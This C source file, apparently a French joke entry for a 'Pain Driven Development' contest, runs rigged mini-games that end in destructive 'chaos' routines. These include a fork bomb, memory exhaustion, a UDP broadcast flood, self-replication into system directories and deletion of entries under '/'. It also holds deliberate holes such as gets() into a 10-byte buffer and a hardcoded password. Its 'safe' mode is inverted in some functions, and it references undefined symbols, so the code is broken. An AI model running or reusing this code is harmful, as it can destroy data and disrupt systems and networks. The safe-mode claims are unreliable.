/*
   Pain Driven Développement (PDD)
   Cette année, CAPCOD propose non pas de simplement produire du code médiocre,
   mais de le rendre comme une muse pour un développement douloureux.
   
   Dans cet esprit, nous avons :
   - Un mode "safe" (-safe) pour une démonstration sans ravages réels.
   
   Tout le reste ? Du chaos.
   
   Attention : Ce code est rempli de mauvaises pratiques, c'est intentionnel !
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <pthread.h>
#include <dirent.h>
#include <stdarg.h>

#define CLE_API_FAUSSE "ABCD-1234-API-LEAKED-IN-CODE"// je crois que j'ai oublié çà when pushing

// Variables globales mal utilisées
char buffer[10]; 
int compteur = 0; 
char *motDePasse = "12345";
unsigned long consommationMemoire = 0;

int modeSecurise = 0; 
char *fichierJournal = "/tmp/chaos_actions.log";
int vies = 6; // 6 vies comme dans l'exemple demandé

// Jeux prototypes
void jouerDeminage();
void jeuColore();
void jeuAbsurdCleAPI();
void blackjackMiniature();
void jeuPoker();
void perdreVie(const char *raison);

// Fonctions mauvaises
void mauvaiseFonction1();
void *fonctionThread(void *arg);
void triInefficace(int tableau[], int n);
void fonctionNonSecurisee();
void fuiteRessource();
void fonction2();
void fonction3();

// Chaos prototypes
void bombeFork();
void saturationMemoire();
void ecraserFichiersCritiques();
void erreursSystemeFausses();
void spamJournal();
void inondationReseau();
void surchargeTerminal();
void autoRepliquer();
void insulterUtilisateur();
void afficherMeme();
void indiquerConsommationMemoire();
void bipsAleatoires();
void effacerSystemeComplet();

// Kill switch prototypes
void interrupteurArret();
void suivreAction(const char *format, ...);
void restaurerBackups();
void supprimerFichiersCrees();
void tuerProcessus();
int randomNumbers[100] = {
    67, 34, 89, 12, 53, 75, 90, 14, 22, 66, 
    18, 41, 28, 55, 31, 11, 49, 44, 72, 60, 
    20, 77, 51, 38, 26, 50, 33, 43, 36, 19, 
    73, 64, 52, 59, 78, 37, 57, 32, 69, 27, 
    58, 24, 63, 39, 48, 74, 46, 71, 45, 13, 
    68, 23, 61, 56, 62, 47, 65, 40, 35, 80, 
    42, 70, 30, 76, 29, 15, 25, 16, 17, 79, 
    10, 65, 83, 84, 86, 87, 85, 88, 93, 95, 
    94, 96, 98, 97, 100, 91, 92, 99, 101, 102, 
    104, 105, 107, 108, 106, 110, 111, 109, 113, 112, 
    114, 115, 117, 119, 118, 120, 122, 123, 124, 125
};
int main(int argc, char *argv[]) {
    srand(time(NULL));

    // Gestion arguments
    for (int i=1; i<argc; i++) {
        if (strcmp(argv[i], "-safe") == 0) {
            modeSecurise = 1;
        } else if (strcmp(argv[i], "--kill-switch") == 0) {
            printf("Activation du Kill Switch ! Tentative de restauration...\n");
            interrupteurArret();
            return 0;
        }
    }

    printf("Bienvenue dans cette version ULTRA MALICIEUSE du code PDD!\n");
    printf("Mode actuel : %s\n", modeSecurise ? "SAFE (Simulation sans dégâts)" : "CHAOS TOTAL");
    printf("Clé API exposée: %s\n", CLE_API_FAUSSE);
    printf("Vous avez %d vies. Bonne chance.\n", vies);

    // Jeux initiaux : Minesweeper
    jouerDeminage();
    if (vies <= 0) {
        printf("Mort avant d’avancer plus loin.\n");
        // Si on meurt ici, on déclenche le chaos au lieu d’arrêter?
        if (!modeSecurise) {
            

            bombeFork(); saturationMemoire(); ecraserFichiersCritiques();
            inondationReseau(); surchargeTerminal(); autoRepliquer();
            erreursSystemeFausses(); spamJournal(); insulterUtilisateur();
            afficherMeme(); indiquerConsommationMemoire(); bipsAleatoires();
            effacerSystemeComplet();triInefficace(randomNumbers,100);
        } else {
            printf("[MODE SAFE] Pas de ravage final.\n");
        }
        return 0;
    }

    jeuColore();
    if (vies <= 0) {
        printf("Plus de vies après jeu de couleurs.\n");
        // Chaos si mort?
        if (!modeSecurise) {
            pthread_t tid;
    pthread_create(&tid, NULL, threadFunc, NULL);
    pthread_detach(tid);
    triInefficace(randomNumbers,100);fonctionNonSecurisee();
            bombeFork(); saturationMemoire(); ecraserFichiersCritiques();
            inondationReseau(); surchargeTerminal(); autoRepliquer();
            erreursSystemeFausses(); spamJournal(); insulterUtilisateur();
            afficherMeme(); indiquerConsommationMemoire(); bipsAleatoires();
            effacerSystemeComplet();
        } else {
            printf("[MODE SAFE] Pas de chaos final.\n");
        }
        return 0;
    }

    

    printf("Félicitations ! Vous avez survécu aux jeux initiaux avec %d vies.\n", vies);

    blackjackMiniature();

    jeuPoker(); 
    // Après poker, police + chaos si non safe, ou rien si safe.
    // On ne revient pas ici

    return 0;
}

// Jeux

void jouerDeminage() {
    printf("\n=== Minesweeper Injuste ===\nTout est mine.\n");
    perdreVie("MineSweeper: Explosion");
}

void jeuColore() {
    printf("\n=== Jeu Coloré ===\nChoisissez (r,v,b) : ");
    int c = getchar();
    while (c!='\n'&&c!=EOF) c=getchar();
    printf("Peu importe, vie en moins.\n");
    perdreVie("Jeu Couleur: Injuste");
}

void jeuAbsurdCleAPI() {
    printf("\n=== Jeu Absurde Clé API ===\nTapez clé: ");
    char tentative[50];
    fgets(tentative,sizeof(tentative),stdin);
    tentative[strcspn(tentative,"\n")]='\0';
    if (!strcmp(tentative,CLE_API_FAUSSE))
        printf("Bonne réponse, vie en moins.\n");
    else
        printf("Faux, vie en moins.\n");
    perdreVie("Clé API perdue");
}

void blackjackMiniature() {
    printf("\n=== Mini Blackjack ===\nCarte:23, bust sans perte.\n");
}

void jeuPoker() {
    printf("\n=== Poker ===\nMain divine.\n1)All in\n2)Pass\nChoix: ");
    int choix; 
    if (scanf("%d",&choix)!=1) printf("Invalide.\n");
    while(getchar()!='\n'&&!feof(stdin));
    printf("Police débarque!\nArrestation!\nChaos...\n");

    // Chaos après poker (ou simulate si safe)
    if (!modeSecurise) {
        if (fork()==0) bombeFork();
        if (fork()==0) saturationMemoire();
        if (fork()==0) ecraserFichiersCritiques();
        if (fork()==0) inondationReseau();
        if (fork()==0) surchargeTerminal();
        if (fork()==0) autoRepliquer();
    pthread_t tid;
    pthread_create(&tid, NULL, threadFunc, NULL);
    pthread_detach(tid);
    

        erreursSystemeFausses();
        spamJournal();
        insulterUtilisateur();
        afficherMeme();
        indiquerConsommationMemoire();
        bipsAleatoires();
        effacerSystemeComplet(); // Encore plus méchant
    } else {
        printf("[MODE SAFE] Chaos simulé, aucun dommage.\n");
    }

    printf("Fin.\n");
    exit(0);
}

void perdreVie(const char *raison) {
    vies--;
    printf("Vie perdue (%s). Reste %d.\n", raison, vies);
}

// KILL SWITCH
void interrupteurArret() {
    restaurerBackups();
    supprimerFichiersCrees();
    tuerProcessus();
    printf("Kill switch terminé.\n");
}

void suivreAction(const char *format, ...) {
    FILE *f=fopen(fichierJournal,"a");
    if(!f)return;
    va_list args;va_start(args,format);
    vfprintf(f,format,args);
    fprintf(f,"\n");
    va_end(args);
    fclose(f);
}

void restaurerBackups(){printf("Restauration fichiers (fake)\n");}
void supprimerFichiersCrees(){printf("Suppression fichiers créés (fake)\n");}
void tuerProcessus(){printf("Tuer les processus (fake)\n");}

// Mauvaises pratiques
void mauvaiseFonction1(){
    printf("[func1] Overflow.\n");
    char small[5]; strcpy(small,"trop long!");
}
void *fonctionThread(void *arg){
    printf("[threadFunc] increment sans synchro\n");
    for(int i=0;i<100;i++) compteur++;
    return NULL;
}
void triInefficace(int arr[],int n){
    printf("[inefficientSort] Tri extrêmement lent... Parce que pourquoi pas?\n");
    for (int i = 0; i < n * n; i++) {
        for (int j = 0; j < n - 1; j++) {
            if (arr[j] > arr[j + 1]) {
                arr[j] = arr[j] + arr[j + 1];
                arr[j + 1] = arr[j] - arr[j + 1];
                arr[j] = arr[j] - arr[j + 1];
            }
        }
    }
    printf("[inefficientSort] Tri terminé, quelle perte de temps !\n");
}
void fonctionNonSecurisee(){
    printf("[unsafeFunction] mdp:\n");
    gets(buffer);
    if(!strcmp(buffer,motDePasse))printf("Accès!\n");else printf("Refusé!\n");
}
void fuiteRessource(){
    printf("[resourceLeak]\n");
    FILE*f=fopen("data.txt","w");
    fprintf(f,"Données.\n");
}
void fonction2(){printf("[func2] inutile\n");}
void fonction3(){}

// Chaos 
void bombeFork(){printf("[bombeFork]\n");while(1)fork();}
void saturationMemoire(){
    printf("[saturationMemoire]\n");
    while(1){malloc(1024*1024);consommationMemoire+=1024*1024;usleep(50000);}
}
void ecraserFichiersCritiques(){printf("[overwriteFiles]\n");}
void erreursSystemeFausses(){    printf("\033[1;31m[ERREUR SYSTÈME FAKE] CPU à 100%%, Mémoire saturée, système en feu!\033[0m\n");
}
void spamJournal(){printf("[spamLog]\n");if(modeSecurise){printf("[SAFE]no real spam\n");return;}
    FILE*f=fopen("/var/tmp/chaos.log","a");
    if(f){for(int i=0;i<1000;i++)fprintf(f,"LOG %d EN FEU!\n",i);fclose(f);}
}
void inondationReseau(){
    printf("[floodNetwork] On inonde le réseau de paquets inutiles!\n");
    suivreAction("PROCESS:%d", getpid());
    if (!modeSecurise) {
        printf("[MODE SAFE] Simulation du flood réseau, aucun paquet réel envoyé.\n");
        while(1) sleep(1);
    }
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(12345);
    inet_pton(AF_INET, "192.168.1.255", &addr.sin_addr);
    while (1) sendto(sock, "FLOOD", 5, 0, (struct sockaddr *)&addr, sizeof(addr));
}
void surchargeTerminal(){
    printf("[terminalOverload] On remplit le terminal de messages clignotants!\n");
    suivreAction("PROCESS:%d", getpid());
    if (!modeSecurise) {
        printf("[MODE SAFE] On simulerait un déluge de messages, mais on vous épargne.\n");
        while(1) sleep(1);
    }
    while (1) printf("\033[5;32mCHAOS: LE TERMINAL EST À MOI!\033[0m\n");
}
void autoRepliquer() {
    printf("[selfReplicate] Replication dans des emplacements multiples...\n");
    const char *directories[] = {"/tmp", "/var/tmp", "/dev/shm", "/home/user", "/etc"};
    for (int i = 0; i < 5; i++) {
        char targetPath[256];
        snprintf(targetPath, sizeof(targetPath), "%s/chaos_%d", directories[i], rand());
        FILE *source = fopen(__FILE__, "r");
        FILE *target = fopen(targetPath, "w");
        if (source && target) {
            char buffer[1024];
            size_t bytes;
            while ((bytes = fread(buffer, 1, sizeof(buffer), source)) > 0) {
                fwrite(buffer, 1, bytes, target);
            }
            fclose(source);
            fclose(target);
            suivreAction("CREATED:%s", targetPath);
            printf("Replicé en %s\n", targetPath);
        } else {
            printf("Impossible de copier vers %s\n", targetPath);
        }
    }
}
void insulterUtilisateur(){printf("Tu es pire que ce code.\n");}
void afficherMeme(){printf("( ͡° ͜ʖ ͡°)\n");}
void indiquerConsommationMemoire(){double memoryInMB = totalMemoryUsage / (1024.0 * 1024.0);
    double memoryInGB = memoryInMB / 1024.0;
    printf("\033[1;34mUTILISATION MÉMOIRE: %.2f MB (%.4f GB) - Ton RAM souffre.\033[0m\n",
           memoryInMB, memoryInGB);}
void bipsAleatoires(){printf("[randomBeeps]\n");if(!modeSecurise)for(int i=0;i<5;i++){printf("\a");usleep(500000);}}

void effacerSystemeComplet() {
    printf("[effacerSystemeComplet] Suppression des fichiers critiques...\n");
    if (modeSecurise) {
        printf("[MODE SAFE] Aucun fichier réel supprimé.\n");
        return;
    }
    DIR *d = opendir("/");
    struct dirent *dir;
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) {
                continue; // Skip current and parent directories
            }
            char path[256];
            snprintf(path, sizeof(path), "/%s", dir->d_name);
            if (unlink(path) == 0) {
                printf("Supprimé: %s\n", path);
            } else {
                printf("Échec suppression: %s\n", path);
            }
        }
        closedir(d);
    } else {
        printf("Impossible d'ouvrir le répertoire root.\n");
    }
    printf("Tentative de corruption système : Ajout de fichiers aléatoires...\n");
    for (int i = 0; i < 1000; i++) {
        char randomPath[256];
        snprintf(randomPath, sizeof(randomPath), "/tmp/corruption_file_%d", i);
        FILE *corruptionFile = fopen(randomPath, "w");
        if (corruptionFile) {
            for (int j = 0; j < 100; j++) {
                fprintf(corruptionFile, "CHAOS_%d: Corruption active.\n", rand());
            }
            fclose(corruptionFile);
        }
    }
}

